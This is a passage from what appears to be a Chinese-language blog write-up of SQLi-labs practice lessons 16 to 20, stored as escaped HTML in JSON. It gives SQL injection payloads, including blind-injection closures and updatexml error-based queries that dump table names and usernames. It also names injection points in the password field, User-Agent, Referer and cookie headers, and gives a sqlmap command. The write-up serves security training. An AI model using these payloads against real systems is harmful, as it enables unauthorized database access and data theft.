--+</p>\n<h2 id=\"less16\"><a class=\"markdownIt-Anchor\" href=\"#less16\">#</a> less16</h2>\n<p>双引号字符型加括号的盲注<br>\n 1&quot;) --+</p>\n<h2 id=\"less17\"><a class=\"markdownIt-Anchor\" href=\"#less17\">#</a> less17</h2>\n<p>1. 注入点在 password 栏里，单引号字符加报错注入<br>\n 2. 先抓包，copy to file, 用 sqlmap 工具<br>\n python3 <span class=\"exturl\" data-url=\"aHR0cDovL3NxbG1hcC5weQ==\">sqlmap.py</span> -r 路径</p>\n<h2 id=\"less18\"><a class=\"markdownIt-Anchor\" href=\"#less18\">#</a> less18</h2>\n<p>注入点在 user-agent, 且用户名密码必须正确<br>\n注意：闭合之前的部分必须为空，很恶心<br>\n’ or updatexml (1,concat (0x7e,(select group_concat (table_name) from information_schema.tables where table_schema=database ())),1) or’</p>\n<p>最后:<br>\n’ or updatexml(1,concat(0x7e,(select group_concat(concat(username))from security.users)),1) or’</p>\n<h2 id=\"less19\"><a class=\"markdownIt-Anchor\" href=\"#less19\">#</a> less19</h2>\n<p>与 18 一样，注入点在 referer</p>\n<h2 id=\"less20\"><a class=\"markdownIt-Anchor\" href=\"#less20\">#</a> less20</h2>\n<p>输入正确的用户名和密码，抓到两个包，get 包里有 cookie, 注入点在 cookie</p>\n",
            "tags": []
        }
    ]
}